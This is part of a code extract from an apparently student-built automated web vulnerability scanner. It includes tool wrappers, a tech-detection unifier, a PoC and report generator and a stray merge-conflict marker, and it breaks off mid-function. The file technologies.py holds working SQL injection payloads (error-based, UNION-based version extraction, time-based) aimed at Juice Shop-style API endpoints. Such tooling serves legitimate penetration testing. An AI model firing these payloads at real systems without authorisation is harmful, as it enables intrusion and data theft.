# Project Code Extract (Part 3/5)
<<<<<<< HEAD
- **Root:** `d:\3차 프로젝트\worker_entry`
- **Files included:** 15 (Total: 72)

---

## File 31: refine_logic.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\refine_logic.py`

```python

def refine_tech_data(raw_results):
    merged = {}
    for item in raw_results:
        # 1. 이름과 버전 정제 (v 제거 및 분리)
        name = str(item.get('name', '')).lower().strip()
        ver = str(item.get('version', '')).replace('v', '').strip()
        source = item.get('source', 'Unknown')
        
        if ':' in name:
            name, ver = name.split(':', 1)
        elif '/' in name:
            name, ver = name.split('/', 1)
            
        if not ver or ver.lower() == 'unknown':
            ver = "Unknown"

        # 2. 기술명 기준으로 데이터 통합
        if name not in merged:
            merged[name] = {
                "name": name,
                "version": ver,
                "sources": [source],
                "evidences": {source: item.get('raw_data', f"Detected via {source}")}
            }
        else:
            if merged[name]["version"] == "Unknown" and ver != "Unknown":
                merged[name]["version"] = ver
            if source not in merged[name]["sources"]:
                merged[name]["sources"].append(source)
                merged[name]["evidences"][source] = item.get('raw_data', f"Confirmed via {source}")
    
    return list(merged.values())
```
---

## File 32: scanner_integrations.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\scanner_integrations.py`

```python
import subprocess
import json
import logging
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

class NucleiScanner:
    """Nuclei 스캐너 통합 (수리 완료)"""
    def __init__(self, templates_path: str = None):
        self.templates_path = templates_path or "/home/lsm/.config/nuclei/nuclei-templates"

    def _categorize_from_tags(self, tags: List[str]) -> str:
        """태그로부터 카테고리 추론"""
        tags_str = " ".join(tags).lower()
        if any(x in tags_str for x in ["cms", "wordpress", "drupal", "joomla"]): return "cms"
        if any(x in tags_str for x in ["javascript", "js", "frontend", "angular", "react", "vue"]): return "frontend"
        if any(x in tags_str for x in ["backend", "server", "api"]): return "backend"
        if any(x in tags_str for x in ["database", "mysql", "postgres", "mongodb"]): return "database"
        if any(x in tags_str for x in ["panel", "admin", "login"]): return "application"
        return "other"

    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[NUCLEI] Running technology detection on {target}...")
            # 확인된 nuclei 절대 경로 사용
            cmd = ["/home/lsm/go/bin/nuclei", "-u", target, "-tags", "tech-detect", "-json", "-silent"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.stdout.strip():
                for line in result.stdout.strip().split("\n"):
                    if not line.strip(): continue
                    try:
                        data = json.loads(line)
                        technologies.append({
                            "name": data.get("info", {}).get("name", "Unknown"),
                            "product": data.get("template-id"),
                            "category": self._categorize_from_tags(data.get("info", {}).get("tags", [])),
                            "source": "nuclei"
                        })
                    except: continue
            print(f"[NUCLEI] Found {len(technologies)} technologies")
        except Exception as e:
            logger.error(f"NUCLEI Error: {e}")
        return technologies

class HttpxScanner:
    """httpx 스캐너 통합"""
    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[HTTPX] Running scan on {target}...")
            cmd = ["httpx", "-tech-detect", "-server", "-json", "-silent"]
            result = subprocess.run(cmd, input=target + "\n", capture_output=True, text=True, timeout=30)
            
            if result.stdout.strip():
                for line in result.stdout.strip().split("\n"):
                    if not line: continue
                    try:
                        data = json.loads(line)
                        if "server" in data:
                            technologies.append({"name": data["server"], "category": "webserver", "source": "httpx"})
                        for tech in data.get("tech", []):
                            technologies.append({"name": tech, "category": "detected", "source": "httpx"})
                    except: continue
            print(f"[HTTPX] Found {len(technologies)} technologies")
        except Exception as e:
            logger.error(f"HTTPX Error: {e}")
        return technologies

class RetireJsScanner:
    """Retire.js 스캐너 (안전 파싱)"""
    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[RETIRE.JS] URL scanning (limited) for {target}")
            cmd = ["retire", "--outputformat", "json", "--severity", "low"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            raw = result.stdout.strip()
            if raw.startswith("[") or raw.startswith("{"):
                try: json.loads(raw)
                except: pass
        except Exception as e:
            logger.error(f"RETIRE.JS Error: {e}")
        return technologies

    def get_max_severity(self, vulns: List[Dict]) -> str:
        severity_order = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'unknown': 0}
        max_sev, max_val = 'unknown', 0
        for vuln in vulns:
            sev = vuln.get('severity', 'unknown').lower()
            if severity_order.get(sev, 0) > max_val:
                max_val = severity_order[sev]
                max_sev = sev
        return max_sev
```
---

## File 33: technologies.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\technologies.py`

```python
import requests
import time
import logging
import re
from typing import List, Dict, Any, Set
from urllib.parse import urljoin, quote

logger = logging.getLogger(__name__)

# 전역 설정
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_TIMEOUT = 10

def debug_print(msg):
    print(f"[DEBUG-TECH] {msg}")

def detect_backend_technologies(target_url: str, known_endpoints: List[str] = None) -> List[Dict[str, Any]]:
    """
    백엔드 심층 탐지 + 버전 정밀 추출 (Data Exfiltration)
    """
    # 안전장치: 함수 내부에서 상수 재정의
    current_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    debug_print(f"Starting analysis for: {target_url}")
    
    technologies: List[Dict[str, Any]] = []
    detected_keys: Set[str] = set()
    session = requests.Session()
    session.headers.update({"User-Agent": current_user_agent})
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    def add_tech(product: str, version: str = "Unknown", category: str = "backend", source: str = "Unknown"):
        # 이미 등록된 기술이라도 버전이 'Unknown'이고 새 정보가 구체적이면 업데이트
        key = f"{product}" # 키를 제품명으로만 관리하여 업데이트 가능하게 함
        
        # 기존에 찾은게 있는지 확인
        existing = next((item for item in technologies if item["product"] == product), None)
        
        if existing:
            if existing["version"] == "Unknown" and version != "Unknown":
                existing["version"] = version
                existing["source"] = source
                logger.info(f"[TECH-DETECT] Updated {product} version to {version}")
                debug_print(f"!!! UPDATE !!! {product} version -> {version} via {source}")
        else:
            technologies.append({
                "name": product, "product": product, "version": version, "category": category, "source": source
            })
            detected_keys.add(key)
            logger.info(f"[TECH-DETECT] Found {product} via {source}")
            debug_print(f"!!! FOUND !!! {product} ({version}) via {source}")

    # --------------------------------------------------------------------------
    # [NEW] SQLite 버전 추출 함수 (Marker 추가 버전)
    # --------------------------------------------------------------------------
    def try_extract_sqlite_version(vuln_url: str):
        debug_print(f"--> Attempting to extract SQLite version from: {vuln_url}")
        
        base_url = vuln_url.split('?')[0] if '?' in vuln_url else vuln_url
        
        for col_count in range(1, 10):
            cols = [f"'{i}'" for i in range(1, col_count + 1)]
            
            # [핵심] 마커를 붙여서 헷갈리지 않게 함
            # SQLite 문자열 연결 연산자는 || 입니다.
            if col_count >= 2:
                cols[1] = "'VER:' || sqlite_version() || ':END'"
            else:
                cols[0] = "'VER:' || sqlite_version() || ':END'"
                
            payload_str = ",".join(cols)
            payload = f"') UNION SELECT {payload_str}--"
            
            try:
                full_attack_url = f"{base_url}?q={quote(payload)}"
                resp = session.get(full_attack_url, timeout=5, verify=False)
                
                # [핵심] 마커(VER:...:END)를 기준으로 추출
                match = re.search(r"VER:(.*?):END", resp.text)
                if match:
                    found_ver = match.group(1)
                    debug_print(f"    [EXPLOIT SUCCESS] Columns: {col_count} | Version: {found_ver}")
                    add_tech("SQLite", version=found_ver, category="database", source="Union-Based SQLi (Verified)")
                    return True
            except: pass
        return False

    # ==============================================================================
    # 1. 대상 엔드포인트 선정
    # ==============================================================================
    critical_defaults = [
        "/rest/products/search",
        "/api/Products/1", 
        "/api/Feedbacks",
        "/api/login"
    ]
    
    discovered = []
    if known_endpoints:
        discovered = [ep for ep in known_endpoints if 'api' in ep or 'rest' in ep][:3]
    
    final_targets = []
    for path in critical_defaults: final_targets.append(urljoin(target_url, path))
    for ep in discovered:
        if ep.startswith("http"): final_targets.append(ep)
        else: final_targets.append(urljoin(target_url, ep))
    final_targets = list(set(final_targets))
    
    debug_print(f"Target endpoints ({len(final_targets)}): {final_targets}")

    # ==============================================================================
    # 2. 공격 실행
    # ==============================================================================
    killer_payloads = ["'", "'))--", "' OR 1=1--"]
    time_payloads = {
        "SQLite": ["' OR (SELECT count(*) FROM sqlite_master AS T1, sqlite_master AS T2, sqlite_master AS T3) OR '"]
    }

    for full_url in final_targets:
        debug_print(f"--> Testing Endpoint: {full_url}")
        
        # 이미 버전을 찾았으면 중단
        sqlite_tech = next((t for t in technologies if t['product'] == 'SQLite'), None)
        if sqlite_tech and sqlite_tech['version'] != "Unknown": break

        # [전략 A] Killer Payloads & Version Extraction
        for payload in killer_payloads:
            try:
                # URL 생성
                if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                else: attack_url = f"{full_url}?q={quote(payload)}"
                
                resp = session.get(attack_url, timeout=5, verify=False)
                content = resp.text
                err_msg = ""
                try: err_msg = str(resp.json())
                except: pass

                # 탐지 로직
                found_sqlite = False
                if 'SQLITE' in err_msg.upper() or 'SQLITE' in content.upper():
                    add_tech("SQLite", category="database", source=f"Error (Killer Payload)")
                    found_sqlite = True
                
                # 탐지되었다면 즉시 버전 추출 시도
                if found_sqlite:
                    try_extract_sqlite_version(full_url)
                    
            except: pass

        # [전략 B] Time-Based Check (버전 추출이 안됐을 때만)
        if any(t['name'] == 'SQLite' for t in technologies): continue

        for db, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    start = time.time()
                    session.get(full_url, timeout=5, verify=False)
                    normal_time = time.time() - start
                    
                    if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                    else: attack_url = f"{full_url}?q={quote(payload)}"

                    start = time.time()
                    session.get(attack_url, timeout=10, verify=False)
                    attack_time = time.time() - start
                    
                    if attack_time > normal_time + 2.0:
                        debug_print(f"    !!! TIME DELAY DETECTED !!!")
                        add_tech(db, category="database", source=f"Time-Based Injection")
                        break
                except: pass

    debug_print(f"Analysis finished. Found: {len(technologies)} techs")
    return technologies
```
---

## File 34: unifier.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\unifier.py`

```python
# app/core/recon/unifier.py
from typing import Dict, List, Any, Optional

class TechUnifier:
    """
    여러 스캔 소스에서 수집된 기술 정보를 통합하고 교차 검증하는 클래스
    (SocketIO 지원 추가)
    """
    def __init__(self, socketio=None):
        self.tech_stack: Dict[str, Dict[str, Any]] = {}
        self.socketio = socketio # 소켓 객체 저장

    def _emit(self, event: str, data: Dict[str, Any]):
        """소켓이 연결되어 있으면 이벤트 전송"""
        if self.socketio:
            try:
                self.socketio.emit(event, data)
            except Exception:
                pass

    def add_tech(self, name: str, version: str = "", category: str = "unknown", 
                 source: str = "unknown", confidence: int = 0):
        if not name or name.lower() == "unknown":
            return

        tech_key = name.lower()
        is_new = tech_key not in self.tech_stack
        
        # 1. 정보 업데이트/추가
        if is_new:
            self.tech_stack[tech_key] = {
                'name': name,
                'version': version,
                'category': category,
                'confidence': confidence,
                'sources': [source]
            }
        else:
            entry = self.tech_stack[tech_key]
            entry['confidence'] = min(100, entry['confidence'] + confidence)
            if source not in entry['sources']:
                entry['sources'].append(source)
            if (not entry['version'] or entry['version'] == "Unknown") and version:
                entry['version'] = version
            elif version and len(version) > len(entry['version']):
                entry['version'] = version

        # 2. [방송] 실시간 로그 전송
        # 예: "[+] Found Nginx (Confidence: 60) via Recog"
        log_msg = f"Detected {name} via {source}"
        if version: log_msg += f" (v{version})"
        
        self._emit('scan_log', {
            'message': log_msg,
            'level': 'success' if confidence > 80 else 'info',
            'confidence': self.tech_stack[tech_key]['confidence']
        })

        # 3. [방송] 기술 스택 업데이트 전송 (대시보드 게이지용)
        self._emit('tech_update', {
            'name': self.tech_stack[tech_key]['name'],
            'confidence': self.tech_stack[tech_key]['confidence'],
            'version': self.tech_stack[tech_key]['version'] or "Unknown",
            'category': self.tech_stack[tech_key]['category']
        })

    def get_results(self, min_confidence: int = 30) -> List[Dict[str, Any]]:
        results = []
        for tech in self.tech_stack.values():
            if tech['confidence'] >= min_confidence:
                results.append({
                    'name': tech['name'],
                    'version': tech['version'] or "Unknown",
                    'category': tech['category'],
                    'confidence': tech['confidence'],
                    'source': ", ".join(tech['sources']),
                    'type': 'unified'
                })
        return sorted(results, key=lambda x: x['confidence'], reverse=True)

    def merge_list(self, tech_list: List[Dict[str, Any]]):
        for item in tech_list:
            self.add_tech(
                name=item.get('name'),
                version=item.get('version', ''),
                category=item.get('category', 'unknown'),
                source=item.get('source', 'unknown'),
                confidence=item.get('confidence', 50)
            )
```
---

## File 35: web.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\recon\web.py`

```python
import requests
import logging
import subprocess
import json
import shutil
import os
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)

def collect_web_info(url):
    """
    이상적인 스캔 워크플로우:
    1. Katana 크롤링 (URL 수집)
    2. Nuclei 스캔 (취약점 후보 탐지)
    3. 필터링: 취약점 발견된 URL만 추출
    4. ZAP Targeted Scan (취약한 URL만 정밀 검증)
    5. VulnerabilityVerifier (실제 검증)
    
    Note: WhatWeb은 Nuclei의 tech-detect 태그로 대체 가능하지만,
          일부 메타데이터(IP, 국가 등)는 WhatWeb이 더 정확할 수 있음
    """
    results = {
        'headers': {}, 
        'webtechnologies': [], 
        'nuclei_vulns': [], 
        'zap_results': None,
        'verifications': []
    }
    
    # Step 0: 기본 헤더 수집 및 기술 스택 추출
    try:
        resp = requests.get(url, timeout=10, verify=False)
        results['headers'] = dict(resp.headers)
        
        # 헤더에서 기술 스택 정보 추출 (Nuclei/WhatWeb 실패 시 대비)
        server = resp.headers.get('Server', '')
        powered_by = resp.headers.get('X-Powered-By', '')
        
        if server:
            results['webtechnologies'].append({
                'name': server.split('/')[0] if '/' in server else server,
                'version': server.split('/')[1] if '/' in server else '',
                'source': 'HTTP-Header'
            })
        
        if powered_by:
            # PHP/5.6.40 형식 파싱
            if 'PHP' in powered_by:
                php_version = powered_by.replace('PHP/', '').split()[0] if 'PHP/' in powered_by else ''
                results['webtechnologies'].append({
                    'name': 'PHP',
                    'version': php_version,
                    'source': 'HTTP-Header'
                })
    except Exception as e:
        logger.warning(f"Failed to get headers: {e}")
        print(f"[STEP 0] ⚠️ 헤더 수집 실패: {e}")

    # Step 1: Katana 크롤링 (URL 수집)
    crawled_urls_file = f"urls_{os.getpid()}.txt"
    all_discovered_urls = [url]  # 기본 URL 포함
    
    try:
        katana_path = shutil.which('katana') or '/usr/local/bin/katana'
        if not os.path.exists(katana_path) and not shutil.which('katana'):
            print(f"[STEP 1] ⚠️ Katana를 찾을 수 없습니다. 기본 URL만 사용합니다.")
            logger.warning("Katana not found, using base URL only")
        else:
            print(f"[STEP 1] 🔍 Katana 크롤링 시작: {url}")
            result = subprocess.run(
                [katana_path, '-u', url, '-silent', '-o', crawled_urls_file], 
                timeout=60,
                errors='ignore',
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[STEP 1] ⚠️ Katana 실행 실패 (코드: {result.returncode}): {result.stderr[:200]}")
                logger.warning(f"Katana failed with code {result.returncode}: {result.stderr}")
            
            if os.path.exists(crawled_urls_file):
                with open(crawled_urls_file, 'r') as f:
                    all_discovered_urls = [line.strip() for line in f if line.strip()]
                    all_discovered_urls = list(set(all_discovered_urls))  # 중복 제거
                    if url not in all_discovered_urls:
                        all_discovered_urls.insert(0, url)  # 기본 URL을 맨 앞에
                print(f"[STEP 1] ✅ {len(all_discovered_urls)}개 URL 발견")
            else:
                print(f"[STEP 1] ⚠️ Katana 결과 파일이 생성되지 않았습니다. 기본 URL만 사용합니다.")
                logger.warning("Katana output file not found")
    except Exception as e:
        logger.error(f"Katana crawling failed: {e}", exc_info=True)
        print(f"[STEP 1] ❌ Katana 크롤링 실패: {e}")
        all_discovered_urls = [url]  # 실패 시 기본 URL만 사용

    # Step 2: Nuclei 스캔 (취약점 + 기술 스택 탐지)
    nuclei_results_file = f"n_res_{os.getpid()}.json"
    vulnerable_urls = []  # 취약점 발견된 URL만 저장
    
    try:
        nuclei_path = shutil.which('nuclei') or '/usr/local/bin/nuclei'
        if not os.path.exists(nuclei_path) and not shutil.which('nuclei'):
            print(f"[STEP 2] ⚠️ Nuclei를 찾을 수 없습니다. 스캔을 건너뜁니다.")
            logger.warning("Nuclei not found, skipping scan")
        else:
            print(f"[STEP 2] 🎯 Nuclei 스캔 시작: {len(all_discovered_urls)}개 URL")
            
            # crawled_urls_file이 존재하는지 확인
            if not os.path.exists(crawled_urls_file):
                # 파일이 없으면 기본 URL만 파일에 작성
                with open(crawled_urls_file, 'w') as f:
                    f.write(url + '\n')
            
            # Nuclei 실행 (취약점 + 기술 스택 탐지)
            cmd = [
                nuclei_path, '-list', crawled_urls_file, '-silent',
                '-tags', 'cve,vuln,tech,exposure,osint',
                '-severity', 'critical,high,medium,low',
                '-j', '-o', nuclei_results_file, 
                '-c', '5', '-rl', '10'  # 화력 조절
            ]
            
            result = subprocess.run(
                cmd, 
                errors='ignore', 
                timeout=300,
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                print(f"[STEP 2] ⚠️ Nuclei 실행 실패 (코드: {result.returncode}): {result.stderr[:200]}")
                logger.warning(f"Nuclei failed with code {result.returncode}: {result.stderr}")
            
            if os.path.exists(nuclei_results_file):
                file_size = os.path.getsize(nuclei_results_file)
                if file_size == 0:
                    print(f"[STEP 2] ⚠️ Nuclei 결과 파일이 비어있습니다.")
                    logger.warning("Nuclei output file is empty")
                else:
                    with open(nuclei_results_file, 'r') as f:
                        for line in f:
                            if not line.strip():
                                continue
                            try:
                                res = json.loads(line)
                                vuln_info = {
                                    'name': res.get('info', {}).get('name', 'Unknown'),
                                    'severity': res.get('info', {}).get('severity', 'info'),
                                    'url': res.get('matched-at', ''),
                                    'template_id': res.get('template-id', ''),
                                    'tags': res.get('info', {}).get('tags', [])
                                }
                                results['nuclei_vulns'].append(vuln_info)
                                
                                # 취약점 발견된 URL 수집 (ZAP 검증용)
                                matched_url = vuln_info['url']
                                if matched_url and matched_url not in vulnerable_urls:
                                    vulnerable_urls.append(matched_url)
                                
                                # 기술 스택 정보 추출 (tech 태그가 있으면)
                                if 'tech' in str(res.get('info', {}).get('tags', [])).lower():
                                    tech_name = vuln_info['name']
                                    results['webtechnologies'].append({
                                        'name': tech_name,
                                        'version': '',  # Nuclei는 버전 정보를 잘 제공하지 않음
                                        'source': 'Nuclei'
                                    })
                            except json.JSONDecodeError as e:
                                logger.debug(f"JSON decode error: {e}")
                                continue
                    
                    print(f"[STEP 2] ✅ {len(results['nuclei_vulns'])}개 취약점 발견, {len(vulnerable_urls)}개 URL이 취약")
                    os.remove(nuclei_results_file)
            else:
                print(f"[STEP 2] ⚠️ Nuclei 결과 파일이 생성되지 않았습니다.")
                logger.warning("Nuclei output file not created")
    except Exception as e:
        logger.error(f"Nuclei scan failed: {e}", exc_info=True)
        print(f"[STEP 2] ❌ Nuclei 스캔 실패: {e}")

    # Step 3: WhatWeb 실행 (Nuclei 보완 - 메타데이터 및 정밀 버전 탐지)
    # Note: Nuclei의 tech-detect는 빠르지만, WhatWeb은 더 정밀한 버전 정보를 제공할 수 있음
    try:
        if shutil.which('whatweb'):
            print(f"[STEP 3] 🔎 WhatWeb 정밀 탐지 (Nuclei 보완): {url}")
            cmd = ['whatweb', '--log-json', '-', url]
            proc = subprocess.run(cmd, capture_output=True, text=True, errors='ignore', timeout=30)
            
            if proc.returncode != 0:
                print(f"[STEP 3] ⚠️ WhatWeb 실행 실패 (코드: {proc.returncode}): {proc.stderr[:200]}")
                logger.warning(f"WhatWeb failed with code {proc.returncode}: {proc.stderr}")
            elif proc.stdout:
                try:
                    data = json.loads(proc.stdout)
                    if data:
                        plugins = data[0].get('plugins', {})
                        for name, info in plugins.items():
                            # 중복 체크 (Nuclei에서 이미 발견한 기술은 제외)
                            existing = next((t for t in results['webtechnologies'] if t['name'] == name), None)
                            if not existing:
                                results['webtechnologies'].append({
                                    'name': name,
                                    'version': info.get('string', [''])[0] if isinstance(info.get('string'), list) else info.get('version', [''])[0] if isinstance(info.get('version'), list) else '',
                                    'source': 'WhatWeb'
                                })
                            elif existing['version'] == '' and info.get('version'):
                                # WhatWeb이 버전 정보를 제공하면 업데이트
                                version = info.get('version', [''])[0] if isinstance(info.get('version'), list) else info.get('version', '')
                                if version:
                                    existing['version'] = version
                                    existing['source'] = 'WhatWeb+Nuclei'
                        print(f"[STEP 3] ✅ WhatWeb 탐지 완료: {len(plugins)}개 기술 발견")
                except json.JSONDecodeError as e:
                    print(f"[STEP 3] ⚠️ WhatWeb JSON 파싱 실패: {e}")
                    logger.warning(f"WhatWeb JSON decode error: {e}")
        else:
            print(f"[STEP 3] ⏭️ WhatWeb이 설치되지 않았습니다. 건너뜁니다.")
            logger.debug("WhatWeb not installed, skipping")
    except Exception as e:
        logger.error(f"WhatWeb scan failed: {e}", exc_info=True)
        print(f"[STEP 3] ❌ WhatWeb 스캔 실패: {e}")

    # Step 4: ZAP Targeted Scan (취약점 발견된 URL만 정밀 검증)
    if vulnerable_urls:
        try:
            print(f"[STEP 4] 🛡️ ZAP Targeted Scan 시작: {len(vulnerable_urls)}개 취약 URL")
            from app.core.scanner.zap_scanner import ZapScanner
            from app.config import Config
            
            # Docker 환경 감지: 환경 변수로 ZAP 호스트 오버라이드 가능
            zap_host = os.getenv('ZAP_PROXY_HOST', Config.ZAP_PROXY_HOST)
            zap_port = int(os.getenv('ZAP_PROXY_PORT', Config.ZAP_PROXY_PORT))
            
            zap_scanner = ZapScanner(
                api_key=os.getenv('ZAP_API_KEY', Config.ZAP_API_KEY),
                proxy_host=zap_host,
                proxy_port=zap_port
            )
            
            # 취약점 발견된 URL만 ZAP으로 정밀 검증
            zap_result = zap_scanner.targeted_scan(vulnerable_urls)
            
            if zap_result and 'alerts' in zap_result:
                results['zap_results'] = {
                    'alerts': zap_result['alerts'],
                    'scanned_urls': len(vulnerable_urls)
                }
                print(f"[STEP 4] ✅ ZAP 검증 완료: {len(zap_result['alerts'])}개 알림 발견")
            else:
                print(f"[STEP 4] ⚠️ ZAP 스캔 실패 또는 알림 없음")
        except Exception as e:
            logger.warning(f"ZAP scan failed: {e}")
            print(f"[STEP 4] ⚠️ ZAP 스캔 실패: {e}")
    else:
        print(f"[STEP 4] ⏭️ 취약점 발견된 URL이 없어 ZAP 스캔 건너뜀")

    # Step 5: VulnerabilityVerifier (실제 검증)
    try:
        if results['nuclei_vulns']:
            print(f"[STEP 5] 🔬 VulnerabilityVerifier 검증 시작")
            from app.core.verifier import VulnerabilityVerifier
            
            # CVE 정보 추출 (Nuclei 결과에서)
            cves = []
            for vuln in results['nuclei_vulns']:
                # template-id나 name에서 CVE ID 추출 시도
                template_id = vuln.get('template_id', '')
                if 'cve' in template_id.lower():
                    cve_id = template_id.upper()
                    cves.append({
                        'id': cve_id,
                        'description': vuln.get('name', ''),
                        'severity': vuln.get('severity', 'medium')
                    })
            
            # VulnerabilityVerifier 실행
            verifier = VulnerabilityVerifier(
                target_url=url,
                endpoints=all_discovered_urls[:50],  # 최대 50개만 (성능 고려)
                cves=cves,
                technologies=results['webtechnologies']
            )
            
            verifications = verifier.verify_all()
            results['verifications'] = verifications
            print(f"[STEP 5] ✅ 검증 완료: {len(verifications)}개 검증 수행")
    except Exception as e:
        logger.warning(f"VulnerabilityVerifier failed: {e}")
        print(f"[STEP 5] ⚠️ 검증 실패: {e}")

    # Step 6: Nmap 전체 스캔 (네트워크 레벨 정보 수집)
    try:
        print(f"[STEP 6] 🔍 Nmap 전체 스캔 시작: {url}")
        from app.core.recon.network import run_recon
        
        # URL에서 호스트 추출
        from urllib.parse import urlparse
        parsed = urlparse(url)
        nmap_target = parsed.hostname or parsed.netloc.split(':')[0]
        
        if nmap_target:
            print(f"[STEP 6] 🎯 Nmap 타겟: {nmap_target}")
            nmap_result = run_recon(nmap_target, aggressive=True)
            
            if nmap_result:
                # Nmap 결과를 기술 스택에 추가
                for host in nmap_result:
                    for port_info in host.get('ports', []):
                        tech = {
                            'name': port_info.get('product', port_info.get('service', 'Unknown')),
                            'version': port_info.get('version', ''),
                            'source': 'Nmap',
                            'port': port_info.get('port'),
                            'service': port_info.get('service', '')
                        }
                        # 중복 체크
                        existing = next((t for t in results['webtechnologies'] 
                                        if t['name'] == tech['name'] and t.get('port') == tech.get('port')), None)
                        if not existing:
                            results['webtechnologies'].append(tech)
                
                # Nmap 결과를 별도 필드로 저장
                results['nmap_results'] = nmap_result
                print(f"[STEP 6] ✅ Nmap 스캔 완료: {len(nmap_result)}개 호스트, {sum(len(h.get('ports', [])) for h in nmap_result)}개 포트")
            else:
                print(f"[STEP 6] ⚠️ Nmap 스캔 결과 없음")
        else:
            print(f"[STEP 6] ⚠️ Nmap 타겟을 추출할 수 없습니다.")
    except ImportError as e:
        print(f"[STEP 6] ⚠️ Nmap 모듈을 import할 수 없습니다: {e}")
        logger.warning(f"Nmap import failed: {e}")
    except Exception as e:
        logger.error(f"Nmap scan failed: {e}", exc_info=True)
        print(f"[STEP 6] ❌ Nmap 스캔 실패: {e}")

    # 정리
    finally:
        if os.path.exists(crawled_urls_file):
            os.remove(crawled_urls_file)

    return results
```
---

## File 36: __init__.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\reporting\__init__.py`

```python
# app/core/reporting/__init__.py

from .generator import ReportGenerator

__all__ = ['ReportGenerator']

```
---

## File 37: generator.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\reporting\generator.py`

```python
# app/core/reporting/generator.py
# 리포팅 및 재현성: PoC 자동 생성, 증거 수집, CVSS 계산

import json
import logging
from typing import Dict, Any, List, Optional
from datetime import datetime
import base64

logger = logging.getLogger(__name__)


class ReportGenerator:
    """
    전문적인 리포팅 기능
    """
    
    def __init__(self):
        self.evidence_collection = []
        self.poc_scripts = []
    
    def generate_poc(self, vulnerability: Dict[str, Any]) -> str:
        """
        발견된 취약점의 curl/Python 재현 스크립트 자동 생성
        """
        vuln_type = vulnerability.get("type", "")
        method = vulnerability.get("method", "GET")
        parameter = vulnerability.get("parameter", "id")
        payload = vulnerability.get("payload", "")
        url = vulnerability.get("url", "")
        
        poc = f"# PoC for {vuln_type}\n"
        poc += f"# Generated: {datetime.now().isoformat()}\n\n"
        
        # curl 명령어
        if method == "GET":
            poc += f"# curl PoC\n"
            poc += f"curl -X GET '{url}?{parameter}={payload}' \\\n"
            poc += f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            poc += f"  -v\n\n"
        else:
            poc += f"# curl PoC\n"
            poc += f"curl -X POST '{url}' \\\n"
            poc += f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
            poc += f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            poc += f"  -d '{parameter}={payload}' \\\n"
            poc += f"  -v\n\n"
        
        # Python 스크립트
        poc += f"# Python PoC\n"
        poc += f"import requests\n\n"
        poc += f"url = '{url}'\n"
        poc += f"payload = '{payload}'\n\n"
        
        if method == "GET":
            poc += f"response = requests.get(url, params={{'{parameter}': payload}}, verify=False)\n"
        else:
            poc += f"response = requests.post(url, data={{'{parameter}': payload}}, verify=False)\n"
        
        poc += f"print(response.text)\n"
        
        return poc
    
    def collect_evidence(
        self,
        request: Dict[str, Any],
        response: Dict[str, Any],
        vulnerability: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        HTTP 요청/응답 자동 캡처, 타임스탬프 기록
        """
        evidence = {
            "timestamp": datetime.now().isoformat(),
            "vulnerability": vulnerability.get("type", ""),
            "request": {
                "method": request.get("method", "GET"),
                "url": request.get("url", ""),
                "headers": request.get("headers", {}),
                "data": request.get("data", ""),
                "params": request.get("params", {})
            },
            "response": {
                "status_code": response.get("status_code", 0),
                "headers": response.get("headers", {}),
                "content_length": response.get("content_length", 0),
                "content_preview": response.get("content", "")[:500]  # 처음 500자만
            },
            "vulnerability_details": vulnerability
        }
        
        self.evidence_collection.append(evidence)
        return evidence
    
    def calculate_cvss_vector(self, vulnerability: Dict[str, Any]) -> str:
        """
        CVSS 벡터 자동 계산
        
        간단한 버전 (실제로는 전문 라이브러리 사용 권장)
        """
        # CVSS 3.1 벡터 형식
        # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        
        # Attack Vector
        av = "N"  # Network (기본값)
        if vulnerability.get("method") == "LOCAL":
            av = "L"
        
        # Attack Complexity
        ac = "L"  # Low (기본값)
        if vulnerability.get("detection_method") == "time_based":
            ac = "H"  # High (복잡함)
        
        # Privileges Required
        pr = "N"  # None (기본값)
        
        # User Interaction
        ui = "N"  # None (기본값)
        
        # Scope
        s = "U"  # Unchanged (기본값)
        
        # Confidentiality Impact
        severity = vulnerability.get("severity", "MEDIUM")
        if severity == "CRITICAL":
            c = "H"
        elif severity == "HIGH":
            c = "H"
        elif severity == "MEDIUM":
            c = "L"
        else:
            c = "N"
        
        # Integrity Impact
        i = c  # 동일하게 설정
        
        # Availability Impact
        a = "N"  # 기본값
        
        vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
        
        return vector
    
    def generate_executive_summary(
        self,
        vulnerabilities: List[Dict[str, Any]],
        attack_paths: List[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        경영진용 요약 리포트 자동 생성
        """
        total_vulns = len(vulnerabilities)
        critical = sum(1 for v in vulnerabilities if v.get("severity") == "CRITICAL")
